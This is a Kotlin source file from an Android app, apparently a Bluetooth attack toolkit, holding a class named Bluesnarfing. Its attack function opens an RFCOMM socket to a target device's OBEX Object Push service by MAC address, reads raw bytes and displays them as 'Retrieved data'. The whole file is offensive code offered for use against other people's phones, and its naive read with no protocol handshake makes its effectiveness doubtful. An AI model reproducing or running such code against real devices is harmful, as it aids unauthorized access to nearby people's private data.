package com.hereliesaz.blusnu.attack

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import java.io.IOException
import java.util.*

import android.widget.Toast
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class Bluesnarfing(
    private val context: Context,
    private val bluetoothAdapter: BluetoothAdapter?
) {
    suspend fun attack(macAddress: String) {
        if (bluetoothAdapter == null) {
            // TODO: Propagate error to UI: Bluetooth not supported
            return
        }

        val device: BluetoothDevice? = bluetoothAdapter.getRemoteDevice(macAddress)
        if (device == null) {
            // TODO: Propagate error to UI: Device not found
            return
        }

        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.BLUETOOTH_CONNECT
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            // TODO: Propagate error to UI: Missing permission
            return
        }

        withContext(Dispatchers.IO) {
            try {
                val uuid = UUID.fromString("00001105-0000-1000-8000-00805f9b34fb")
                device.createRfcommSocketToServiceRecord(uuid).use { socket ->
                    socket.connect()
                    val inputStream = socket.inputStream
                    val buffer = ByteArray(1024)
                    val bytes = inputStream.read(buffer)
                    val data = String(buffer, 0, bytes)
                    withContext(Dispatchers.Main) {
                        Toast.makeText(context, "Retrieved data: $data", Toast.LENGTH_LONG).show()
                    }
                }
            } catch (e: IOException) {
                withContext(Dispatchers.Main) {
                    Toast.makeText(context, "Error: ${e.message}", Toast.LENGTH_LONG).show()
                }
                e.printStackTrace()
            }
        }
    }
}